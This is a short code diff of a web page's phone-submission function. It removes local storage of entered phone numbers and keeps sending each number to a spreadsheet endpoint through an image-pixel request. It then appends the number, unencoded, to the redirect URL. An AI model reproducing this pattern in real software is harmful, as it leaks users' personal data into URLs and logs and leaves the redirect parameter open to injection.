@@ -44,16 +44,10 @@ function submitPhone() {
   }
   err.textContent = '';
 
-  // 存入localStorage（登录页存，100%可靠）
-  try {
-    var list = JSON.parse(localStorage.getItem('gk_phones') || '[]');
-    list.push({ phone: phone, time: new Date().toISOString() });
-    localStorage.setItem('gk_phones', JSON.stringify(list));
-  } catch(e) {}
-  // 图片像素发给Google表格
+  // 图片像素发给Google表格（WiFi能通）
   new Image().src = API + '?phone=' + encodeURIComponent(phone);
-  // 跳转
-  window.location.href = TARGET;
+  // 跳转带号码
+  window.location.href = TARGET + '?phone=' + phone;
 }
 </script>
 
